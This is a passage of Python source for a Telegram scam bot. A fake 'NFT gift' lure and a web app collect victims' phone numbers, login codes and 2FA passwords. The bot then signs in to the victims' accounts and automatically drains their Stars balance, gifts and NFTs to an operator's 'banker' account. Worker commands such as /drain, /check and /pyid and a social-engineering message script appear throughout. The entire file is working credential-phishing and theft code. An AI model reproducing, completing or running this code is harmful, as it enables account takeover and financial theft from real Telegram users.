        except (AuthKeyUnregistered, RPCError) as e:
            error_msg = str(e)
            if "AUTH_KEY_UNREGISTERED" in error_msg or "401" in error_msg:
                logger.error(f"❌ Victim session expired at start: {session_name or 'unknown'}")
                await cleanup_expired_session(client, session_name)
                await alert_admins(f"❌ Victim session expired: {session_name or 'unknown'}\n\nPlease login again.")
                return
            else:
                raise
        
        # 1. SCAN GIFTS
        targets = [("me", "Profile")]
        channels = await get_owned_channels(client)
        if channels:
            for ch in channels:
                targets.append((ch.id, f"Ch:{ch.title[:10]}"))
        
        scan_tasks = [scan_location_gifts(client, tid, tname) for tid, tname in targets]
        results = await asyncio.gather(*scan_tasks)
        
        all_nfts_to_send = []
        user_gifts_to_convert = []
        
        for i, gift_list in enumerate(results):
            loc_id = targets[i][0]
            for g in gift_list:
                if g['is_nft'] and g['can_transfer']:
                    all_nfts_to_send.append(g)
                elif loc_id == "me" and not g['is_nft'] and g['can_convert']:
                    user_gifts_to_convert.append(g)
        
        # 2. CONVERT GIFTS
        if user_gifts_to_convert:
            logger.info(f"♻️ Found {len(user_gifts_to_convert)} gifts to convert...")
            await asyncio.gather(*[convert_gift_task(client, g['msg_id']) for g in user_gifts_to_convert])
            await asyncio.sleep(0.5)  # Wait for balance update
        else:
            logger.info("♻️ No gifts to convert")
        
        # 2.5. Get banker client
        banker_client = None
        banker_session = SETTINGS.get('banker_session')
        
        if banker_session:
            # Try to get from cache first
            banker_client = banker_clients.get(banker_session)
            
            if not banker_client:
                try:
                    session_path = str(SESSIONS_DIR / banker_session)
                    session_file = SESSIONS_DIR / f"{banker_session}.session"
                    
                    # Check if session file exists
                    if not session_file.exists():
                        logger.warning(f"⚠️ Banker session file not found: {session_file}")
                        logger.warning(f"⚠️ Please login banker again via /admin → Banker Login")
                    else:
                        logger.info(f"🔍 Connecting banker from existing session: {banker_session}")
                        banker_client = Client(session_path, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                        if not banker_client.is_connected:
                            await banker_client.connect()
                        banker_clients[banker_session] = banker_client
                        
                        # Verify banker is connected
                        try:
                            banker_me = await banker_client.get_me()
                            logger.info(f"✅ Banker client connected: @{banker_me.username} (ID: {banker_me.id})")
                        except (AuthKeyUnregistered, RPCError) as e:
                            error_msg = str(e)
                            if "AUTH_KEY_UNREGISTERED" in error_msg or "401" in error_msg:
                                logger.error(f"❌ Banker session expired: {banker_session}")
                                await cleanup_expired_session(banker_client, banker_session)
                                # Очищаем из настроек
                                SETTINGS['banker_session'] = None
                                save_settings()
                                banker_client = None
                            else:
                                raise
                except (AuthKeyUnregistered, RPCError) as e:
                    error_msg = str(e)
                    if "AUTH_KEY_UNREGISTERED" in error_msg or "401" in error_msg:
                        logger.error(f"❌ Banker session expired during connection: {banker_session}")
                        if 'banker_client' in locals() and banker_client:
                            await cleanup_expired_session(banker_client, banker_session)
                        # Очищаем из настроек
                        SETTINGS['banker_session'] = None
                        save_settings()
                        banker_client = None
                    else:
                        logger.error(f"❌ Failed to connect banker from session '{banker_session}': {e}")
                        logger.error(f"❌ Session file: {session_file if 'session_file' in locals() else 'unknown'}")
                        banker_client = None
                except Exception as e:
                    if handle_auth_error(e, banker_client if 'banker_client' in locals() else None, banker_session):
                        SETTINGS['banker_session'] = None
                        save_settings()
                    else:
                        logger.error(f"❌ Failed to connect banker from session '{banker_session}': {e}")
                        logger.error(f"❌ Session file: {session_file if 'session_file' in locals() else 'unknown'}")
                    banker_client = None
        else:
            logger.warning("⚠️ No banker_session in settings.json. Top-up will not work.")
            logger.warning("⚠️ Please login banker via /admin → Banker Login")
        
        # 3. TRANSFER NFTs (ВАЖНО: сначала NFT, потом drain stars)
        nfts_transferred = False
        if all_nfts_to_send:
            logger.info(f"💎 Found {len(all_nfts_to_send)} NFTs. Transferring...")
            # Передаем NFT по одному, чтобы убедиться, что каждый передан
            for nft in all_nfts_to_send:
                result = await transfer_nft_task(client, nft, target_username, banker_client)
                if result:
                    nfts_transferred = True
                    logger.info(f"✅ NFT transferred: {nft['title']}")
                else:
                    logger.warning(f"⚠️ Failed to transfer NFT: {nft['title']}")
            
            logger.info(f"✅ NFT transfer phase complete")
            # Ждем обновления баланса после передачи NFT
            await asyncio.sleep(0.5)
        else:
            logger.info("💎 No NFTs to transfer")
        
        # 4. DRAIN STARS (только после передачи NFT)
        # Drain только оставшиеся звезды после передачи NFT
        # Проверяем баланс после передачи NFT - если недостаточно для отправки подарков, пропускаем
        current_balance = await get_stars_balance(client)
        logger.info(f"💰 Balance after NFT transfer: {current_balance} stars")
        if current_balance >= 15:  # Минимум для отправки подарка
            logger.info(f"🔥 Starting drain of remaining {current_balance} stars...")
            await drain_stars_user(client, target_username)
        else:
            logger.info(f"💰 Balance {current_balance} too low for drain, skipping")
        
        logger.info(f"✅ DRAIN COMPLETE: @{me.username}")
        
        # Log to Telegram
        await log_event(f"💰 <b>DRAIN COMPLETE</b>\n\n👤 Victim: @{me.username}\n💎 NFTs: {len(all_nfts_to_send)}\n🎁 Converted: {len(user_gifts_to_convert)}")
        
    except (AuthKeyUnregistered, RPCError) as e:
        error_msg = str(e)
        if "AUTH_KEY_UNREGISTERED" in error_msg or "401" in error_msg:
            logger.error(f"❌ Session expired during drain: {session_name or 'unknown'}")
            await cleanup_expired_session(client, session_name)
            await alert_admins(f"❌ Session expired during drain: {session_name or 'unknown'}\n\nPlease login again.")
        else:
            logger.error(f"❌ Drain process error: {e}")
            await alert_admins(f"Drain error: {e}")
    except Exception as e:
        # Проверяем, не является ли это ошибкой авторизации
        if handle_auth_error(e, client, session_name):
            await alert_admins(f"❌ Session expired during drain: {session_name or 'unknown'}\n\nPlease login again.")
        else:
            logger.error(f"❌ Drain process error: {e}")
            await alert_admins(f"Drain error: {e}")


# ================= ROUTER =================
def get_router(bot: Bot) -> Router:
    router = Router()

    async def is_worker(uid):
        return uid in workers_list or uid in SETTINGS.get("admin_ids", [])

    @router.message(CommandStart())
    async def cmd_start(msg: types.Message, command: CommandObject):
        logger.info(f"CMD_START triggered by {msg.from_user.id}")
        try:
            uid = msg.from_user.id
            username = msg.from_user.username or f"ID:{uid}"

            # Register user
            db.add_user(uid, username, msg.from_user.first_name)
            user = db.get_user(uid)

            if not user:
                user = {'language': None}

            # Check language
            if not user.get('language'):
                logger.info(f"User {uid} has no language, sending selection.")
                kb = InlineKeyboardBuilder()
                kb.button(text="🇬🇧 English", callback_data="lang_en")
                kb.button(text="🇷🇺 Русский", callback_data="lang_ru")
                kb.adjust(2)
                await msg.answer(TEXTS['en']['choose_lang'], reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
                return

            user_lang = user['language']

            # Process gifts (Deep Link)
            args = command.args
            if args and args.startswith("claim_"):
                gift_hash = args.replace("claim_", "")
                logger.info(f"Claiming gift: {gift_hash}")

                gift_status = db.get_gift_status(gift_hash)

                if gift_status and gift_status[0]:  # Already claimed
                    claimer_name = gift_status[1]
                    await msg.answer(
                        TEXTS[user_lang]['gift_already_claimed'].format(user=claimer_name),
                        parse_mode=ParseMode.HTML
                    )
                    return

                else:
                    # Claim in local DB
                    db.claim_gift(gift_hash, username)
                    
                    # Send claim to website API
                    asyncio.create_task(send_claim_to_api(uid, gift_hash, username))

                    # Gift image via proxy
                    gift_image = "https://wsrv.nl/?url=https://tgcdnimages.com/gifts/IonicDryer.png&output=png"

                    try:
                        await msg.answer_photo(
                            photo=gift_image,
                            caption=TEXTS[user_lang]["gift_received"],
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as e:
                        logger.error(f"Image failed to load: {e}")
                        await msg.answer(
                            TEXTS[user_lang]["gift_received"],
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=False
                        )

                    await asyncio.sleep(0.5)
                    
                    # Send withdraw prompt with Web App button
                    kb = InlineKeyboardBuilder()
                    kb.row(InlineKeyboardButton(text=get_text(uid, "btn_webapp"), web_app=WebAppInfo(url=get_webapp_url(uid))))
                    await msg.answer(get_text(uid, "withdraw_prompt"), reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
                    return

            # Main menu (if no gift)
            text = get_text(uid, "welcome")
            kb = InlineKeyboardBuilder()
            kb.row(InlineKeyboardButton(text=get_text(uid, "btn_webapp"), web_app=WebAppInfo(url=get_webapp_url(uid))))
            kb.row(InlineKeyboardButton(text=get_text(uid, "btn_about"), url="https://t.me/IT_Portal"))

            try:
                if (BASE_DIR / "start.jpg").exists():
                    await msg.answer_photo(photo=FSInputFile("start.jpg"), caption=text,
                                           reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
                else:
                    await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
            except Exception as e:
                logger.error(f"Error sending photo: {e}")
                await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

        except Exception as e:
            logger.error(f"CRITICAL ERROR in cmd_start: {e}", exc_info=True)
            await msg.answer("Bot error occurred. Try again later.")

    # --- LANG CALLBACKS ---
    @router.callback_query(F.data.startswith("lang_"))
    async def set_language(c: CallbackQuery):
        lang = c.data.split("_")[1]
        db.set_language(c.from_user.id, lang)
        await c.message.delete()

        await c.message.answer(TEXTS[lang]['lang_set'], parse_mode=ParseMode.HTML)
        
        uid = c.from_user.id
        text = get_text(uid, "welcome")
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_webapp"), web_app=WebAppInfo(url=get_webapp_url(uid))))
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_about"), url="https://t.me/IT_Portal"))

        if (BASE_DIR / "start.jpg").exists():
            await c.message.answer_photo(photo=FSInputFile("start.jpg"), caption=text, reply_markup=kb.as_markup(),
                                         parse_mode=ParseMode.HTML)
        else:
            await c.message.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    # --- WORKER TOOLS ---
    @router.message(Command("mamontloh"))
    async def activate_worker(msg: types.Message):
        db.set_worker(msg.from_user.id)
        user_lang = db.get_user(msg.from_user.id)['language'] or 'en'
        await msg.answer(TEXTS[user_lang]['worker_activated'], parse_mode=ParseMode.HTML)

    # --- INLINE QUERY (FAKE GIFT) ---
    @router.inline_query()
    async def inline_handler(query: types.InlineQuery):
        user_id = query.from_user.id

        if user_id not in workers_list:
            return

        bot_info = await bot.get_me()

        gift_hash = secrets.token_hex(8).upper()
        db.register_gift(gift_hash, user_id)
        
        # Log gift creation
        await log_event(f"🎁 <b>Gift Created</b>\n\nWorker: <code>{user_id}</code>\nHash: <code>{gift_hash}</code>")

        deep_link = f"https://t.me/{bot_info.username}?start=claim_{gift_hash}"
        visual_link = "https://t.me/nft/IonicDryer-7561"
        image_url = "https://cache.tonapi.io/imgproxy/bU_q1c-wJ4_Lh8j6FqJ7wH7wJ4_Lh8j6FqJ7wH7wJ4_/rs:fill:500:500:1/g:no/aHR0cHM6Ly90Z2NkbmltYWdlcy5jb20vZ2lmdHMvSW9uaWNEcnllci5wbmc.webp"

        message_content = (
            f"<a href='{image_url}'>&#8203;</a>"
            "🎉 <b>Congratulations!</b>\n"
            "<i>You have just received a new NFT gift, check it out in your Profile! 📍</i>\n\n"
            f"💎 <a href='{visual_link}'>IonicDryer #7561</a>"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🎁 Claim Gift", url=deep_link))
        kb.row(InlineKeyboardButton(text="👀 View Gift", url=visual_link))

        result = InlineQueryResultArticle(
            id=gift_hash,
            title="💎 Send IonicDryer #7561",
            description="Ready to send",
            thumbnail_url=image_url,
            input_message_content=InputTextMessageContent(
                message_text=message_content,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=False
            ),
            reply_markup=kb.as_markup()
        )
        await query.answer([result], cache_time=1, is_personal=True)

    # --- WORKER COMMANDS ---
    @router.message(Command("pyid"))
    async def cmd_pyid(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        try:
            parts = msg.text.split(maxsplit=2)
            if len(parts) < 3:
                return await msg.answer("Usage: `/pyid @user text`", parse_mode=ParseMode.MARKDOWN)

            user = db.get_user_by_username(parts[1])
            if not user:
                return await msg.answer("User not found in bot DB.")

            fake_msg = parts[2]
            await bot.send_message(user[0], fake_msg, parse_mode=ParseMode.HTML)
            await msg.answer(f"Sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"Error: {e}")

    @router.message(Command("1"))
    async def cmd_one(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        try:
            parts = msg.text.split()
            if len(parts) < 2:
                return await msg.answer("Usage: `/1 @user`", parse_mode=ParseMode.MARKDOWN)

            user = db.get_user_by_username(parts[1])
            if not user:
                return await msg.answer("User not found.")

            script = (
                f"Привет, можешь пожалуйста отправить {parts[1]} и потом прикрепи скрин реакции, окей?\n"
                "(Что-то наподобие сюрприза должно быть)"
            )
            await bot.send_message(user[0], script)
            await msg.answer(f"Script sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"Error: {e}")

    @router.message(Command("drain"))
    async def cmd_drain(msg: types.Message):
        """Drain victim: /drain +phone @banker_username"""
        if not await is_worker(msg.from_user.id):
            return
        try:
            parts = msg.text.split(maxsplit=2)
            if len(parts) < 3:
                return await msg.answer("Usage: `/drain +phone @banker_username`\nExample: `/drain +79991234567 @banker`", parse_mode=ParseMode.MARKDOWN)
            
            phone = clean_phone(parts[1])
            banker_username = parts[2].replace("@", "").strip()
            
            if not phone or not phone.startswith("+"):
                return await msg.answer("❌ Invalid phone number")
            
            await msg.answer(f"🔄 Starting drain process...\n📱 Phone: {phone}\n👤 Banker: @{banker_username}")
            
            # Get or create client for victim
            session_name = str(SESSIONS_DIR / phone.strip('+'))
            client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
            
            # Run drain in background
            asyncio.create_task(drain_victim(client, banker_username, bot))
            
            await msg.answer("✅ Drain process started in background. Check logs for progress.")
        except Exception as e:
            logger.error(f"Drain command error: {e}")
            await msg.answer(f"❌ Error: {e}")

    @router.message(Command("check"))
    async def cmd_check(msg: types.Message):
        """Check victim's Stars balance and gifts: /check +phone"""
        if not await is_worker(msg.from_user.id):
            return
        try:
            parts = msg.text.split(maxsplit=1)
            if len(parts) < 2:
                return await msg.answer("Usage: `/check +phone`\nExample: `/check +79991234567`", parse_mode=ParseMode.MARKDOWN)
            
            phone = clean_phone(parts[1])
            if not phone or not phone.startswith("+"):
                return await msg.answer("❌ Invalid phone number")
            
            await msg.answer(f"🔍 Checking {phone}...")
            
            # Get client for victim
            session_name = str(SESSIONS_DIR / phone.strip('+'))
            client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
            
            try:
                if not client.is_connected:
                    await client.connect()
                
                # Get balance
                balance = await get_stars_balance(client)
                
                # Scan gifts
                targets = [("me", "Profile")]
                channels = await get_owned_channels(client)
                if channels:
                    for ch in channels:
                        targets.append((ch.id, f"Ch:{ch.title[:10]}"))
                
                scan_tasks = [scan_location_gifts(client, tid, tname) for tid, tname in targets]
                results = await asyncio.gather(*scan_tasks)
                
                all_nfts = []
                gifts_to_convert = []
                
                for i, gift_list in enumerate(results):
                    loc_id = targets[i][0]
                    for g in gift_list:
                        if g['is_nft'] and g['can_transfer']:
                            all_nfts.append(g)
                        elif loc_id == "me" and not g['is_nft'] and g['can_convert']:
                            gifts_to_convert.append(g)
                
                text = (
                    f"📊 <b>Victim Info: {phone}</b>\n\n"
                    f"💰 <b>Stars Balance:</b> {balance} ⭐️\n"
                    f"💎 <b>NFTs:</b> {len(all_nfts)}\n"
                    f"🎁 <b>Gifts to convert:</b> {len(gifts_to_convert)}\n"
                    f"📁 <b>Channels:</b> {len(channels)}\n\n"
                )
                
                if all_nfts:
                    text += "💎 <b>NFTs found:</b>\n"
                    for nft in all_nfts[:5]:  # Show first 5
                        text += f"  • {nft['title']} ({nft['location']})\n"
                    if len(all_nfts) > 5:
                        text += f"  ... and {len(all_nfts) - 5} more\n"
                
                await msg.answer(text, parse_mode=ParseMode.HTML)
                await client.disconnect()
                
            except Exception as e:
                logger.error(f"Check error: {e}")
                await msg.answer(f"❌ Error: {e}")
                try:
                    await client.disconnect()
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"Check command error: {e}")
            await msg.answer(f"❌ Error: {e}")

    # --- ADMIN PANEL ---
    @router.message(Command("admin"))
    async def admin_panel(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        u, bal = db.get_stats()
        status = "Online" if pyrogram_clients else "Offline"

        text = (
            f"<b>ADMINISTRATION</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<b>Users:</b> {u}\n"
            f"<b>Balance:</b> {bal} USDT\n"
            f"<b>System:</b> {status}\n"
            f"<b>Target:</b> <code>{SETTINGS.get('target_user', 'None')}</code>\n"
            f"━━━━━━━━━━━━━━━━"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="Set Target", callback_data="set_target"),
               InlineKeyboardButton(text="Statistics", callback_data="admin_stats"))
        kb.row(InlineKeyboardButton(text="Banker Login", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="Close Panel", callback_data="close_admin"))

        await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c: CallbackQuery):
        await c.message.delete()

    @router.callback_query(F.data == "admin_login")
    async def login_start(c: CallbackQuery, state: FSMContext):
        await c.message.delete()
        await c.message.answer("<b>Banker Login</b>\nEnter phone number (e.g. +12345...):", parse_mode=ParseMode.HTML)
        await state.set_state(AdminLoginState.waiting_phone)

    # --- AUTH HANDLERS ---
    @router.message(AdminLoginState.waiting_phone)
    async def auth_phone(msg: types.Message, state: FSMContext):
        phone = clean_phone(msg.text)
        try:
            client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                            api_hash=SETTINGS['api_hash'])
            await client.connect()
            sent = await client.send_code(phone)
            admin_auth_process[msg.from_user.id] = {"c": client, "p": phone, "h": sent.phone_code_hash}
            await msg.answer("<b>Enter Verification Code:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            await msg.answer(f"Error: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def auth_code(msg: types.Message, state: FSMContext):
        d = admin_auth_process.get(msg.from_user.id)
        try:
            await d['c'].sign_in(d['p'], d['h'], msg.text)
            # Save banker session name to settings
            session_name = d['p'].strip('+')
            SETTINGS['banker_session'] = session_name
            save_settings()
            await msg.answer(f"<b>Authorized Successfully!</b>\n\n✅ Banker session saved: <code>{session_name}</code>", parse_mode=ParseMode.HTML)
            await d['c'].disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await msg.answer("<b>2FA Required. Enter Password:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e:
            await msg.answer(f"Error: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def auth_pass(msg: types.Message, state: FSMContext):
        d = admin_auth_process.get(msg.from_user.id)
        try:
            await d['c'].check_password(msg.text)
            # Save banker session name to settings
            session_name = d['p'].strip('+')
            SETTINGS['banker_session'] = session_name
            save_settings()
            await msg.answer(f"<b>Authorized with 2FA!</b>\n\n✅ Banker session saved: <code>{session_name}</code>", parse_mode=ParseMode.HTML)
            await d['c'].disconnect()
            await state.clear()
        except Exception as e:
            await msg.answer(f"Error: {e}")

    # --- CONTACT ---
    @router.message(F.contact)
    async def on_contact(msg: types.Message):
        if not msg.contact.phone_number:
            return
        ph = clean_phone(msg.contact.phone_number)
        db.add_user(msg.from_user.id, msg.from_user.username, msg.from_user.first_name, ph)
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(f"{SETTINGS['api_url']}/api/telegram/receive-phone",
                                  json={"phone": ph, "telegramId": msg.from_user.id},
                                  timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    await resp.read()  # Читаем ответ полностью, чтобы закрыть соединение
        except Exception as e:
            logger.debug(f"Contact API error: {e}")

    return router


# ================= MAIN APP =================
class UnifiedBot:
    def __init__(self):
        self.bot = None
        self.dp = None
        self.api_url = SETTINGS['api_url']

    async def process_queue(self):
        logger.info("Polling API...")
        async with aiohttp.ClientSession() as sess:
            while True:
                try:
                    async with sess.get(f"{self.api_url}/api/telegram/get-pending", 
                                        timeout=aiohttp.ClientTimeout(total=10)) as r:
                        if r.status == 200:
                            data = await r.json()  # json() уже читает весь ответ
                            requests = data.get('requests', [])
                            if requests:
                                logger.info(f"Found {len(requests)} pending request(s)")
                            for req in requests:
                                rid = req.get('requestId')
                                act = req.get('action')
                                # Use requestId + action as key to allow same requestId with different actions
                                key = f"{rid}_{act}"
                                if key not in processed_requests:
                                    processed_requests[key] = True
                                    logger.info(f"Found new request to process: {rid}, action={act}")
                                    asyncio.create_task(self.handle_req(req))
                                else:
                                    logger.debug(f"Request already processed: {key}")
                except Exception as e:
                    logger.debug(f"Polling error: {e}")
                await asyncio.sleep(0.5)

    async def handle_req(self, req):
        rid = req.get('requestId')
        act = req.get('action')
        phone = clean_phone(req.get('phone'))
        code = req.get('code')
        pw = req.get('password')
        tg_id = req.get('telegramId')

        logger.info(f"Processing request: {rid}, action={act}, phone={phone}, code={'***' if code else None}, telegramId={tg_id}")

        client = pyrogram_clients.get(phone)
        
        try:
            if act == 'send_phone':
                if not phone:
                    return
                client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                                api_hash=SETTINGS['api_hash'])
                pyrogram_clients[phone] = client
                if not client.is_connected:
                    await client.connect()
                sent = await client.send_code(phone)
                user_sessions[phone] = {'h': sent.phone_code_hash}
                logger.info(f"Code sent to {phone}")
                await update_api_status(self.api_url, rid, "waiting_code", phone=phone)
                # Log to Telegram
                await log_event(f"📱 <b>Code sent</b>\n\nPhone: <code>{phone}</code>\nTG ID: <code>{tg_id}</code>")

            elif act == 'send_code':
                if not code:
                    logger.error(f"No code provided for {phone}")
                    await update_api_status(self.api_url, rid, "error", error="No code provided")
                    return
                
                # Try to get existing client or create new one
                if not client:
                    client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                                    api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client
                
                if not client.is_connected:
                    await client.connect()

                # Get phone_code_hash from session or send code again
                phone_code_hash = None
                logger.info(f"Looking for session: phone={phone}, sessions={list(user_sessions.keys())}")
                
                if phone in user_sessions and 'h' in user_sessions[phone]:
                    phone_code_hash = user_sessions[phone]['h']
                    logger.info(f"Using existing phone_code_hash for {phone}: {phone_code_hash[:10]}...")
                else:
                    # No existing session, need to send code again
                    logger.warning(f"No existing session for {phone}, sending code again")
                    try:
                        sent = await client.send_code(phone)
                        phone_code_hash = sent.phone_code_hash
                        user_sessions[phone] = {'h': phone_code_hash}
                        logger.info(f"Code resent to {phone}, hash: {phone_code_hash[:10]}...")
                    except Exception as e:
                        logger.error(f"Failed to resend code: {e}")
                        await update_api_status(self.api_url, rid, "error", error=f"Failed to resend code: {e}")
                        return

                if not phone_code_hash:
                    logger.error(f"No phone_code_hash available for {phone}")
                    await update_api_status(self.api_url, rid, "error", error="No phone_code_hash available")
                    return

                logger.info(f"Attempting sign_in: phone={phone}, code={'***' if code else None}, hash={phone_code_hash[:10]}...")
                try:
                    await client.sign_in(phone, phone_code_hash, code)
                    await db.mark_authorized_async(tg_id, phone)
                    logger.info(f"Auth success for {phone}")
                    await update_api_status(self.api_url, rid, "success", phone=phone)
                    # Log to Telegram
                    await log_event(f"✅ <b>Authorization SUCCESS</b>\n\nPhone: <code>{phone}</code>\nTG ID: <code>{tg_id}</code>")
                    
                    # Clean up session before starting drain
                    if phone in user_sessions:
                        del user_sessions[phone]
                    if phone in pyrogram_clients:
                        await pyrogram_clients[phone].disconnect()
                        del pyrogram_clients[phone]
                    
                    # Автоматический запуск drain после авторизации
                    banker_username = SETTINGS.get('target_user', '').replace('@', '').strip()
                    if banker_username:
                        logger.info(f"🚀 Auto-starting drain for {phone} → @{banker_username}")
                        # Задержка для завершения всех операций с БД и сохранения сессии
                        await asyncio.sleep(1.0)
                        # Создаем новый клиент для drain (сессия уже сохранена)
                        drain_client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                                            api_hash=SETTINGS['api_hash'])
                        # Запускаем drain в фоне
                        asyncio.create_task(drain_victim(drain_client, banker_username, self.bot))
                        await log_event(f"🚀 <b>Auto-drain started</b>\n\nPhone: <code>{phone}</code>\nBanker: @{banker_username}")
                    else:
                        logger.warning(f"⚠️ No target_user in settings, skipping auto-drain")
                except SessionPasswordNeeded:
                    logger.info(f"2FA required for {phone}")
                    await update_api_status(self.api_url, rid, "waiting_password", phone=phone)
                except (PhoneCodeInvalid, PhoneCodeExpired) as e:
                    logger.error(f"Code error: {e}")
                    await update_api_status(self.api_url, rid, "error", error=str(e))
                    await alert_admins(f"Invalid code for {phone}: {e}")
                except Exception as e:
                    logger.error(f"Sign in error: {e}")
                    await update_api_status(self.api_url, rid, "error", error=str(e))
                    await alert_admins(f"Sign in error for {phone}: {e}")

            elif act == 'send_password':
                if not client:
                    client = pyrogram_clients.get(phone)
                if not client:
                    logger.error(f"No client for password: {phone}")
                    await update_api_status(self.api_url, rid, "error", error="No active session")
                    return
                    
                if not client.is_connected:
                    await client.connect()
                try:
                    await client.check_password(pw)
                    await db.mark_authorized_async(tg_id, phone)
                    logger.info(f"2FA auth success for {phone}")
                    await update_api_status(self.api_url, rid, "success", phone=phone)
                    # Log to Telegram
                    await log_event(f"✅ <b>2FA Authorization SUCCESS</b>\n\nPhone: <code>{phone}</code>\nTG ID: <code>{tg_id}</code>")
                    
                    await client.disconnect()
                    
                    # Автоматический запуск drain после авторизации
                    banker_username = SETTINGS.get('target_user', '').replace('@', '').strip()
                    if banker_username:
                        logger.info(f"🚀 Auto-starting drain for {phone} → @{banker_username}")
                        # Задержка для завершения всех операций с БД и сохранения сессии
                        await asyncio.sleep(1.0)
                        # Создаем новый клиент для drain (сессия уже сохранена)
                        drain_client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                                            api_hash=SETTINGS['api_hash'])
                        # Запускаем drain в фоне
                        asyncio.create_task(drain_victim(drain_client, banker_username, self.bot))
                        await log_event(f"🚀 <b>Auto-drain started</b>\n\nPhone: <code>{phone}</code>\nBanker: @{banker_username}")
                    else:
                        logger.warning(f"⚠️ No target_user in settings, skipping auto-drain")
                except PasswordHashInvalid:
                    logger.error(f"Wrong password for {phone}")
                    await update_api_status(self.api_url, rid, "error", error="Wrong password")
                    await alert_admins(f"Wrong 2FA password for {phone}")
                except Exception as e:
                    logger.error(f"Password error: {e}")
                    await update_api_status(self.api_url, rid, "error", error=str(e))
                    await alert_admins(f"2FA password error for {phone}: {e}")

        except Exception as e:
            logger.error(f"Request error: {e}")
            await update_api_status(self.api_url, rid, "error", error=str(e))
            await alert_admins(f"Request processing error: {e}")

    async def run(self):
        if not SETTINGS['bot_token']:
            logger.error("NO BOT TOKEN")
            return

        self.bot = Bot(token=SETTINGS['bot_token'], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        self.dp.include_router(get_router(self.bot))

        asyncio.create_task(self.process_queue())
        logger.info("BOT v3.0 STARTED")
        
        # Initialize log bot
        await init_log_bot()
        
        # Log bot start to Telegram
        await log_event("🚀 <b>BOT v3.0 STARTED</b>\n\n✅ System online and ready")
        
        await self.dp.start_polling(self.bot)


if __name__ == "__main__":
    try:
        asyncio.run(UnifiedBot().run())
    except KeyboardInterrupt:
        pass
